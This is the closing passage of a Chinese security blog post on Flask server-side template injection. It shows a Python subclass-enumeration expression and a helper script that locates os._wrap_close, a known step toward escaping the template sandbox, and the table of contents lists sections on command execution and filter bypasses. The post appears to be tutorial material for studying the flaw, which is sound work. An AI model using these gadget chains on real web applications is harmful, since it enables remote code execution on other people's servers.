<pre><code>Python 3.7.8
&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()
...一大堆的子类
</code></pre>
<p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p>
<p>find2.py</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p>
<pre><code>import json

a = &quot;&quot;&quot;
&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;
&quot;&quot;&quot;

num = 0
allList = []

result = &quot;&quot;
for i in a:
    if i == &quot;&gt;&quot;:
        result += i
        allList.append(result)
        result = &quot;&quot;
    elif i == &quot;\n&quot; or i == &quot;,&quot;:
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if &quot;os._wrap_close&quot; in v:
        print(str(k)+&quot;---&gt;&quot;+v)
</code></pre>
<p>[<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码">](</p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">John Doe</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak框架/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">John Doe的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8Bssti%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">初始ssti漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.</span> <span class="toc-text">路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">渲染方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.3.</span> <span class="toc-text">模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">%s</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number"></span> <span class="toc-text">{{ code }}&lt;&#x2F;h1&gt;&#39;,code&#x3D;code)
</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">0.1.</span> <span class="toc-text">SSTI文件读取&#x2F;命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">0.1.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">0.1.2.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">0.1.3.</span> <span class="toc-text">命令执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E6%A6%82%E8%BF%87%E7%A8%8B%EF%BC%88%E8%AF%BB%E5%8F%96config%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">大概过程（读取config）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E6%9C%894%E4%B8%AA%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.1.</span> <span class="toc-text">flask有4个全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E8%87%AA%E5%B8%A6%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">python自带函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#config"><span class="toc-number">1.2.1.</span> <span class="toc-text">config</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#request"><span class="toc-number">1.2.2.</span> <span class="toc-text">request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session"><span class="toc-number">1.2.3.</span> <span class="toc-text">session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#url-for"><span class="toc-number">1.2.4.</span> <span class="toc-text">url_for()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-flashed-messages"><span class="toc-number">1.2.5.</span> <span class="toc-text">get_flashed_messages()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">一些绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%B0%8F%E6%8B%AC%E5%8F%B7"><span class="toc-number">2.1.</span> <span class="toc-text">过滤了小括号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-class%E3%80%81-subclasses%E3%80%81-read%E7%AD%89%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-number">2.1.1.</span> <span class="toc-text">过滤了 class、 subclasses、 read等关键词</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">2.1.2.</span> <span class="toc-text">过滤了下划线_</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%AD%E6%8B%AC%E5%8F%B7-%E5%92%8C"><span class="toc-number">2.1.3.</span> <span class="toc-text">过滤了中括号[和]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-join"><span class="toc-number">2.1.4.</span> <span class="toc-text">过滤了|join</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E6%95%8C%E7%BB%95%E8%BF%87%E7%9A%84%E6%9C%80%E7%BB%88RCE"><span class="toc-number">2.1.5.</span> <span class="toc-text">无敌绕过的最终RCE</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python2%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number"></span> <span class="toc-text">python2的方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AD%94%E6%94%B9%E5%AD%97%E7%AC%A6"><span class="toc-number"></span> <span class="toc-text">魔改字符</span></a></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/">ssi服务端包含注入 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2021 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>